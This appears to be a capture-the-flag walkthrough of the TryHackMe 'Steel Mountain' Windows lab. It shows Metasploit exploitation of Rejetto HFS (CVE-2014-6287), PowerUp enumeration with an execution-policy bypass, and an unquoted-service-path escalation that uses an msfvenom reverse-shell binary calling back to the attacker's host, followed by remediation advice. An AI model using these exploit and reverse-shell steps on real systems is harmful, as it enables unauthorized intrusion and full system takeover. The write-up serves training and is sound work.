---
title: "TryHackMe: Steel Mountain — Rejetto HFS RCE (CVE-2014-6287) & Unquoted Service Path PrivEsc"
author: parthpandey
categories: [TryHackMe, Walkthroughs]
tags: [windows, rejetto-hfs, unquoted-service-path, powerup, metasploit, privesc, cve-2014-6287]
render_with_liquid: false
date: 2026-10-22 19:15:00 +0530
---

**Steel Mountain** is a comprehensive Windows penetration testing room based on the Mr. Robot corporate universe. This walkthrough demonstrates OSINT employee discovery, remote code execution against an outdated web file server (**Rejetto HTTP File Server 2.3 / CVE-2014-6287**), post-exploitation enumeration with **PowerUp.ps1**, and escalating to `NT AUTHORITY\SYSTEM` by exploiting an **Unquoted Service Path** vulnerability.

---

## Room Metadata

| Attribute | Specification |
|:---|:---|
| **Platform** | TryHackMe |
| **Room URL** | [tryhackme.com/room/steelmountain](https://tryhackme.com/room/steelmountain) |
| **Target OS** | Windows Server 2008 R2 / Windows 7 Enterprise |
| **Difficulty** | Easy |
| **Vulnerabilities** | Rejetto HFS Remote Code Execution (CVE-2014-6287), Insecure Unquoted Service Path (`AdvancedSystemCareService9`) |
| **Key Utilities** | `nmap`, Metasploit, `PowerUp.ps1`, `msfvenom` |

---

## Attack Chain Overview

```
[Phase 1: Initial Reconnaissance & OSINT]
   │── Nmap Scan identifies web services on Port 80 and Port 8080
   │── Port 80: Steel Mountain corporate website ("Employee of the Month" image inspection: Bill Harper)
   └── Port 8080: Rejetto HTTP File Server (HFS) Version 2.3
         │
[Phase 2: Weaponizing Rejetto HFS (CVE-2014-6287)]
   │── Null byte %00 string vulnerability allows arbitrary command injection
   │── Launch Metasploit: exploit/windows/http/rejetto_hfs_exec
   └── Meterpreter session established as user: bill
         │
[Phase 3: Automated Privilege Escalation Auditing]
   │── Upload & execute PowerUp.ps1:
   │     powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
   └── Identified Vulnerability:
         ServiceName: AdvancedSystemCareService9
         PathName: C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
         CanRestart: True (bill has permission to stop/start service)
         Unquoted Service Path: Insecure spaces in path!
         │
[Phase 4: Exploiting Unquoted Service Path]
   │── Windows Path Search Logic:
   │     1. C:\Program.exe
   │     2. C:\Program Files (x86)\IObit\Advanced.exe
   │     3. C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
   │── Generate reverse shell payload named: Advanced.exe
   │── Move Advanced.exe to: C:\Program Files (x86)\IObit\
   │── Restart service: sc stop AdvancedSystemCareService9 && sc start AdvancedSystemCareService9
   └── Windows executes Advanced.exe as SYSTEM ──> Full Root Flag Captured
```

---

## Phase 1: Service Scanning & Web OSINT

We run an Nmap port and version scan:

```console
$ nmap -sC -sV -p- -T4 --min-rate 1000 -oN steel_scan.txt 10.10.140.75
```

```
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HttpFileServer 2.3
```

### Investigating Web Endpoints
1. **Port 80**: Inspecting the image element on the corporate index page reveals the file name `BillHarper.png` — identifying the employee of the month as **Bill Harper**.
2. **Port 8080**: Running **HttpFileServer 2.3 (HFS)**. Clicking on the server version link navigates to `rejetto.com/hfs/`, confirming this is vulnerable to **CVE-2014-6287**.

---

## Phase 2: Exploitation via Rejetto HFS (CVE-2014-6287)

CVE-2014-6287 is caused by poor input handling in the RegExp macro parsing engine, allowing remote unauthenticated attackers to execute arbitrary commands by appending null bytes (`%00`) to HTTP requests.

Launch Metasploit:

```console
$ msfconsole -q
msf6 > use exploit/windows/http/rejetto_hfs_exec
msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.140.75
msf6 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080
msf6 exploit(windows/http/rejetto_hfs_exec) > set LHOST 10.10.14.30
msf6 exploit(windows/http/rejetto_hfs_exec) > set LPORT 4444
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit
```

Meterpreter session opens:

```console
[*] Sending stage (175686 bytes) to 10.10.140.75
[*] Meterpreter session 1 opened (10.10.14.30:4444 -> 10.10.140.75:49195)
meterpreter > getuid
Server username: STEELMOUNTAIN\bill
meterpreter > cat "C:\Users\bill\Desktop\user.txt"
b04763...[REDACTED USER FLAG]
```

---

## Phase 3: Auditing with PowerUp.ps1

To identify local privilege escalation paths, we upload `PowerUp.ps1`:

```console
meterpreter > upload /opt/PowerSploit/Privesc/PowerUp.ps1 C:\\Users\\bill\\Desktop\\PowerUp.ps1
[*] uploaded: /opt/PowerSploit/Privesc/PowerUp.ps1 -> C:\Users\bill\Desktop\PowerUp.ps1

meterpreter > load powershell
meterpreter > powershell_shell
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks
```

### PowerUp Findings

```
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
```

Notice:
1. The service path **contains spaces** and is **not enclosed in quotation marks**.
2. The service starts automatically with **`LocalSystem`** (`NT AUTHORITY\SYSTEM`).
3. User `bill` has permission to **restart the service** (`CanRestart: True`).

---

## Phase 4: Weaponizing the Unquoted Service Path

### How Unquoted Service Paths Work
When Windows attempts to launch a service configured with an unquoted executable path containing spaces, the operating system attempts to interpret each space-separated segment as an executable:

1. `C:\Program.exe`
2. `C:\Program Files (x86)\IObit\Advanced.exe`
3. `C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe`

If write permissions exist in any parent directory (such as `C:\Program Files (x86)\IObit\`), placing an executable named `Advanced.exe` ensures that Windows will execute our payload **before** reaching `ASCService.exe`.

### Step 1: Generate Malicious Binary

```console
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.30 LPORT=5555 -e x86/shikata_ga_nai -f exe -o Advanced.exe
```

### Step 2: Upload Payload & Plant Binary

In Meterpreter:

```console
meterpreter > cd "C:\\Program Files (x86)\\IObit"
meterpreter > upload Advanced.exe
[*] uploaded: Advanced.exe -> C:\Program Files (x86)\IObit\Advanced.exe
```

### Step 3: Catch SYSTEM Reverse Shell

Start a Netcat listener on your attacking machine:

```console
$ nc -lvnp 5555
```

Restart the vulnerable service:

```console
meterpreter > shell
C:\Program Files (x86)\IObit> sc stop AdvancedSystemCareService9
C:\Program Files (x86)\IObit> sc start AdvancedSystemCareService9
```

Windows attempts to launch the service, intercepts `C:\Program Files (x86)\IObit\Advanced.exe`, and runs it as `SYSTEM`:

```console
connect to [10.10.14.30] from (UNKNOWN) [10.10.140.75] 49210
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type "C:\Users\Administrator\Desktop\root.txt"
9af579...[REDACTED ROOT FLAG]
```

---

## Defensive Remediation

| Issue | Mitigation |
|:---|:---|
| **CVE-2014-6287** | Decommission or upgrade Rejetto HFS. Legacy HTTP file sharing services should be replaced with hardened SFTP or enterprise object storage solutions. |
| **Unquoted Service Paths** | Wrap all Windows service binary paths in quotes within the registry: `HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>\ImagePath`. Example: `"C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"`. |
| **Directory ACLs** | Enforce strict ACLs on `C:\Program Files\` and subdirectories so non-administrative users cannot create files or subfolders. |

